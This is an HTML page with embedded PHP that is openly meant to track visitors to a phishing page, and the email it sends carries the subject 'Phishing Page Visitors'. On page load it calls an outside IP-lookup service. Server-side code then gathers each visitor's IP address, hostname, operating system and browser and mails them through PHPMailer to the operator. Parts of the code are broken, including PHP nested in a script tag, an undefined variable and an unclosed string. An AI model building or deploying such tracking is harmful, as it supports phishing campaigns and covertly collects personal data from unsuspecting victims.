<html xmlns="http://www.w3.org/1999/xhtml">
   <head>
      <script>
         function myFunction() {
            var x = navigator.userAgent;
         }
      </script>
      <script type="text/javascript">
         var z;
      </script>
   <body onload="myFunction()">
      <script type="text/javascript" src="https://l2.io/ip.js?var=z"></script>
      <script type="text/javascript">
         var z = x + y; 
         
          <?php 
            $xyz = $_SERVER['REMOTE_ADDR'];
            $pqr = gethostbyaddr($_SERVER['REMOTE_ADDR']);
            $user_agent = $_SERVER['HTTP_USER_AGENT'];
            function getOS() {
            
            global $user_agent;
            
            $os_platform  = "Unknown OS Platform";
            
            $os_array     = array(
                                '/windows nt 10/i'      =>  'Windows 10',
                                '/windows nt 6.3/i'     =>  'Windows 8.1',
                                '/windows nt 6.2/i'     =>  'Windows 8',
                                '/windows nt 6.1/i'     =>  'Windows 7',
                                '/windows nt 6.0/i'     =>  'Windows Vista',
                                '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                '/windows nt 5.1/i'     =>  'Windows XP',
                                '/windows xp/i'         =>  'Windows XP',
                                '/windows nt 5.0/i'     =>  'Windows 2000',
                                '/windows me/i'         =>  'Windows ME',
                                '/win98/i'              =>  'Windows 98',
                                '/win95/i'              =>  'Windows 95',
                                '/win16/i'              =>  'Windows 3.11',
                                '/macintosh|mac os x/i' =>  'Mac OS X',
                                '/mac_powerpc/i'        =>  'Mac OS 9',
                                '/linux/i'              =>  'Linux',
                                '/ubuntu/i'             =>  'Ubuntu',
                                '/iphone/i'             =>  'iPhone',
                                '/ipod/i'               =>  'iPod',
                                '/ipad/i'               =>  'iPad',
                                '/android/i'            =>  'Android',
                                '/blackberry/i'         =>  'BlackBerry',
                                '/webos/i'              =>  'Mobile'
                          );
            
            foreach ($os_array as $regex => $value)
              if (preg_match($regex, $user_agent))
                  $os_platform = $value;
            
            return $os_platform;
            }
            
            function getBrowser() {
            
            global $user_agent;
            
            $browser        = "Unknown Browser";
            
            $browser_array = array(
                                  '/msie/i'      => 'Internet Explorer',
                                  '/firefox/i'   => 'Firefox',
                                  '/safari/i'    => 'Safari',
                                  '/chrome/i'    => 'Chrome',
                                  '/edge/i'      => 'Edge',
                                  '/opera/i'     => 'Opera',
                                  '/netscape/i'  => 'Netscape',
                                  '/maxthon/i'   => 'Maxthon',
                                  '/konqueror/i' => 'Konqueror',
                                  '/mobile/i'    => 'Handheld Browser'
                           );
            
            foreach ($browser_array as $regex => $value)
              if (preg_match($regex, $user_agent))
                  $browser = $value;
            
            return $browser;
            }
            
            
            $user_os        = getOS();
            $user_browser   = getBrowser();
            
            $lmn = "<strong>Browser: </strong>".$user_browser."<br /><strong>Operating System: </strong>".$user_os."";
            
             ?>
             <?php
            use PHPMailer\PHPMailer\PHPMailer;
            use PHPMailer\PHPMailer\Exception;
            
            require '/PHPMailer/src/Exception.php';
            require '/PHPMailer/src/PHPMailer.php';
            require '/PHPMailer/src/SMTP.php';
            //Load composer's autoloader
            //require 'vendor/autoload.php';
            
            $mail = new PHPMailer(true);                              // Passing `true` enables exceptions
            try {
                //Server settings
                $mail->SMTPDebug = 4;                                 // Enable verbose debug output
                $mail->isSMTP();                                      // Set mailer to use SMTP
                $mail->Host = 'example.dreamhost.com';                // Specify main and backup SMTP servers
                $mail->SMTPAuth = true;                               // Enable SMTP authentication
                $mail->Username = '';                                 // SMTP username
                $mail->Password = '';                                 // SMTP password
                $mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
                $mail->Port = 587;                                    // TCP port to connect to
            
                //Recipients
                $mail->setFrom('Email_ID', 'Name TO Display');
                $mail->addAddress('Recipients@examle.com', 'Recipients');      // Add a recipient   
                $mail->addAddress('ellen@example.com');                        // Name is optional
                $mail->addReplyTo('info@example.com', 'Information');
                $mail->addCC('cc@example.com');
                $mail->addBCC('bcc@example.com');
            
                //Attachments
                //$mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
                //$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name
            
                //Content
                $mail->isHTML(true);                                  // Set email format to HTML
                $mail->Subject = 'Phishing Page Visitors';
                $mail->Body    = 'Please find the details of the Visitor on your page:</b></br></br></br>
                '.'<strong>IP:</strong> '.$xyz.'</br>
                '.'<strong>Hostname:</strong> '.$pqr. '</br>
                '.'<strong>Host Details:</strong>'.$lmn. '</br>
                ; 
            
                $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
            
                $mail->send();
                //echo 'Message has been sent';
            } catch (Exception $e) {
                //echo 'Message could not be sent. Mailer Error: ', $mail->ErrorInfo;
            }
            ?>
         
          
      </script>
   </body>
</html>